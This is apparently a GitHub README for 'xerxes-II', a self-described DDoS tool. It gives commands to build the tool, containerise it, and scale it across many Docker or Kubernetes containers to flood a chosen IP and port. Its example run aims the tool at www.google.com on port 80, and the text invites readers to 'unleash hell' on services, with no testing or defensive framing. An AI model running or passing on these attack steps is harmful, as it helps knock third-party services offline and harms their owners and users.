# xerxes-ii
---
XERXES-ii is a DDOS tool powered by `containers`. 

## Usage

To unleash hell on a particular service 
- Clone the repository`$ git clone https://github.com/ahab94/xerxes-II.git`
- Change Directory to the xerxes-II `$ cd xerxes-II`

### Build executable
*Note: gcc dependencies are required*
- Compile and build xerxes-II `$ gcc -o xerxes-II xerxes-II.c`

### Build image
- Build a docker image image`$ sudo docker build . -t xerxes`

### DDOS using Kubernetes
*NOTE: Kubernetes is required to be setup on the host*
- Create `Xerxes` pod `$ kubectl create -f kubernetes/xerxes-ii-pod.yaml`

### DDOS using Docker
*NOTE: Docker and DockerCompose must be installed on the host*
- In docker-compose.yml define the IP and Port you want to do DDOS on for example.
```YAML
version: '2'
services:
  xerxes-ii-some-service-1:
    image: xerxes
    environment:
      - IP=some-service-1-ip-or-hostname
      - PORT=some-service-1-port

  xerxes-ii-some-service-2:
    image: xerxes
    environment:
      - IP=some-service-2-ip-or-hostname
      - PORT=some-service-2-port

  xerxes-ii-some-service-3:
    image: xerxes
    environment:
      - IP=some-service-3-ip-or-hostname
      - PORT=some-service-3-port
```
- Spawn N number of containers for DDOS `$ sudo docker-compose up --scale xerxes-ii-some-service-1=<number-of-nodes-for-DDOS>`

### Spawning container for dev env
- Initiate xerxes-II container `$ sudo docker run -e IP=www.google.com -e PORT=80 -it xerxes`

### Spawning process for dev env
- Spawn the xerxes-II process `$ bash entrypoint-to-hell.sh`
